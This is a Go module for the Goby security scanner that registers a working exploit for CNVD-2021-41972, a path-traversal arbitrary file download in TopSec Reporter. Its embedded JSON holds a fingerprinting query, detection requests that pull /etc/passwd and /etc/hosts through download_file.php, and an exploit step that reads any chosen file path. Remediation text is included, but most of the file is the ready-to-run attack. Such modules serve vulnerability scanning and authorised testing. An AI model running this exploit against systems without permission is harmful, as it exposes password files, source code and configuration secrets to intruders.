package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "TopSec Reporter Arbitrary file download CNVD-2021-41972",
  "Description": "Tianrongxin Technology Group, founded on August 30, 1985, is a leading provider of network security, big data and secure cloud services in China.\\nRandom file download vulnerability exists in Tianrongxin Technology Group Reporter, which can be used by attackers to obtain sensitive information.",
  "Product": "TOPSEC Reporter",
  "Homepage": "http://www.topsec.com.cn",
  "DisclosureDate": "2021-07-18",
  "Author": "luckying1314@139.com",
  "GobyQuery": "title=\"Reporter\"",
  "Level": "2",
  "Impact": "<p><span style=\"font-size: 14px;\">The vulnerability of arbitrary file download or read is mainly caused by the fact that when the application system provides the function of file download or read, the application system directly specifies the file path in the file path parameter without verifying the validity of the file path. As a result, the attacker can jump through the directory (..</span><span style=\"font-size: 14px;\">\\ or..</span><span style=\"font-size: 14px;\">/) to download or read a file beyond the original specified path.</span><span style=\"font-size: 14px;\">The attacker can finally download or read any files on the system through this vulnerability, such as database files, application system source code, password configuration information and other important sensitive information, resulting in sensitive information leakage of the system.</span><br></p>",
  "Recommandation": "<p><span style=\"font-size: 14px;\">Limit ..</span><span style=\"font-size: 14px;\">/ symbol is used to determine the input path when the file is downloaded. The best method is that the file should be one to one in the database, and avoid entering the absolute path to obtain the file</span><br></p>",
  "References": [
    "https://www.cnvd.org.cn/flaw/show/CNVD-2021-41972"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "path",
      "type": "createSelect",
      "value": "../../../../../../../../../etc/passwd,../../../../../../../../../etc/hosts",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/view/action/download_file.php?filename=../../../../../../../../../etc/passwd",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "root",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "daemon",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/view/action/download_file.php?filename=../../../../../../../../../etc/hosts",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "127.0.0.1",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/view/action/download_file.php?filename={{{path}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "file download"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}